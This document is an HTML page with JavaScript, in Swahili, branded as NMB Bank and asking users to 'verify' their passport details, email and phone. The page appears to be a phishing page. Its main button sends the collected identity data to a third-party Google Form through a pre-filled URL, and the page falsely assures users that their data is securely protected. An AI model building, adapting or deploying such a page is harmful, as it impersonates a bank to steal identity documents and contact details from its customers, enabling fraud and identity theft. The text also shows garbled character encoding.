<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thibitisha Taarifa â€“ NMB</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
    <img src="images/nmb_logo.png" alt="NMB Bank" class="logo">

    <h1>Saidia kuhudumiwa haraka</h1>
    <p class="subtitle">Thibitisha taarifa zako ili kuendelea</p>

    <div class="card">
        <div class="card-header">
            <h2>Taarifa Zilizopatikana</h2>
        </div>

        <!-- Passport Fields -->
        <div class="field">
            <label>First Name</label>
            <input type="text" id="firstName">
        </div>

        <div class="field">
            <label>Last Name</label>
            <input type="text" id="lastName">
        </div>

        <div class="field">
            <label>Passport Number</label>
            <input type="text" id="passportNumber">
        </div>

        <div class="field">
            <label>Nationality</label>
            <input type="text" id="nationality">
        </div>

        <div class="field">
            <label>Date of Birth</label>
            <input type="date" id="dateOfBirth">
        </div>

        <div class="field">
            <label>Gender</label>
            <select id="gender">
                <option value="">Chagua</option>
                <option value="Male">Mwanaume</option>
                <option value="Female">Mwanamke</option>
            </select>
        </div>

        <div class="field">
            <label>Expiry Date</label>
            <input type="date" id="expiryDate">
        </div>

        <!-- Extra fields -->
        <div class="field">
            <label>Email</label>
            <input type="email" id="email">
        </div>

        <div class="field">
            <label>Phone</label>
            <input type="tel" id="phone">
        </div>
    </div>

    <div class="actions">
        <button class="btn btn-retake" onclick="location.href='camera.html'">
            Piga picha tena
        </button>

        <button class="btn btn-continue" id="continueBtn">
            Endelea (zamani)
        </button>

        <!-- New main button for pre-filled URL -->
        <button class="btn btn-primary" id="prefillBtn" style="margin-top: 15px; background: #00cc00; font-size: 1.2em; padding: 15px;">
            Endelea na Taarifa Zimejazwa
        </button>
    </div>

    <p class="security">ðŸ”’ Taarifa zako zinalindwa kwa usalama wa hali ya juu</p>
</div>

<script>
    // â”€â”€ PASTE YOUR REAL GOOGLE FORM ENTRY IDs HERE â”€â”€
    // How to get them: Edit form â†’ 3 dots â†’ Get pre-filled link â†’ fill dummy values (like "TEST1", "TEST2") â†’ Get link â†’ look at URL
    const FIELD_IDS = {
        firstName:     'entry.193643575',     // â† CHANGE THIS
        lastName:      'entry.1073966424',     // â† CHANGE THIS
        passportNumber:'entry.1672759103',     // â† CHANGE THIS
        nationality:   'entry.1590946585',     // â† CHANGE THIS
        dateOfBirth:   'entry.155910832',     // â† CHANGE THIS
        gender:        'entry.1056652020',     // â† CHANGE THIS (use exact option text: "Male" or "Female")
           // â† CHANGE THIS
    };

    const GOOGLE_FORM_BASE_URL = "https://docs.google.com/forms/d/e/1FAIpQLScJWSvFw76jO1EexVx4XZ49Pp8y5pDLVZ-5adMgz5d3ixuu9w/viewform";

    document.addEventListener("DOMContentLoaded", () => {
        // 1. Get OCR or dummy fallback data (unchanged)
        let ocrData = JSON.parse(sessionStorage.getItem("ocrData") || "{}");

        if (!ocrData.firstName) {
            ocrData = {
                firstName: "JOHN",
                lastName: "DOE",
                passportNumber: "A1234567",
                nationality: "USA",
                dateOfBirth: "1990-01-01",
                gender: "Male",
                expiryDate: "2030-01-01"
            };
            sessionStorage.setItem("ocrData", JSON.stringify(ocrData));
        }

        // 2. Prefill form fields (unchanged)
        document.getElementById('firstName').value = ocrData.firstName;
        document.getElementById('lastName').value = ocrData.lastName;
        document.getElementById('passportNumber').value = ocrData.passportNumber;
        document.getElementById('nationality').value = ocrData.nationality;
        document.getElementById('dateOfBirth').value = ocrData.dateOfBirth;
        document.getElementById('gender').value = ocrData.gender;
        document.getElementById('expiryDate').value = ocrData.expiryDate;

        document.getElementById('email').value = sessionStorage.getItem("email") || "";
        document.getElementById('phone').value = sessionStorage.getItem("phone") || "";

        // 3. New pre-fill button (main flow)
        document.getElementById('prefillBtn').addEventListener('click', () => {
            const data = {
                firstName: document.getElementById('firstName').value.trim(),
                lastName: document.getElementById('lastName').value.trim(),
                passportNumber: document.getElementById('passportNumber').value.trim(),
                nationality: document.getElementById('nationality').value.trim(),
                dateOfBirth: document.getElementById('dateOfBirth').value,
                gender: document.getElementById('gender').value,
                expiryDate: document.getElementById('expiryDate').value,
                email: document.getElementById('email').value.trim(),
                phone: document.getElementById('phone').value.trim()
            };

            // Build URL parameters safely
            const params = new URLSearchParams();
            params.append('usp', 'pp_url'); // Required for pre-fill

            if (FIELD_IDS.firstName)     params.append(FIELD_IDS.firstName,     data.firstName);
            if (FIELD_IDS.lastName)      params.append(FIELD_IDS.lastName,      data.lastName);
            if (FIELD_IDS.passportNumber)params.append(FIELD_IDS.passportNumber,data.passportNumber);
            if (FIELD_IDS.nationality)   params.append(FIELD_IDS.nationality,   data.nationality);
            if (FIELD_IDS.dateOfBirth)   params.append(FIELD_IDS.dateOfBirth,   data.dateOfBirth);
            if (FIELD_IDS.gender)        params.append(FIELD_IDS.gender,        data.gender);
            if (FIELD_IDS.expiryDate)    params.append(FIELD_IDS.expiryDate,    data.expiryDate);
            if (FIELD_IDS.email)         params.append(FIELD_IDS.email,         data.email);
            if (FIELD_IDS.phone)         params.append(FIELD_IDS.phone,         data.phone);

            const prefillUrl = `${GOOGLE_FORM_BASE_URL}?${params.toString()}`;

            alert("Fomu inafunguliwa na taarifa zako tayari zimejazwa! Thibitisha na tuma tu.");
            window.open(prefillUrl, '_blank');
        });

        // 4. Old continue button (kept for fallback/debugging)
        document.getElementById('continueBtn').addEventListener('click', () => {
            const data = {
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                passportNumber: document.getElementById('passportNumber').value,
                nationality: document.getElementById('nationality').value,
                dateOfBirth: document.getElementById('dateOfBirth').value,
                gender: document.getElementById('gender').value,
                expiryDate: document.getElementById('expiryDate').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value
            };

            console.log("User confirmed data:", data);
            sessionStorage.setItem("confirmedData", JSON.stringify(data));

            alert("Tumia kitufe cha 'Endelea na Taarifa Zimejazwa' kwa urahisi zaidi!");
        });
    });
</script>

</body>
</html>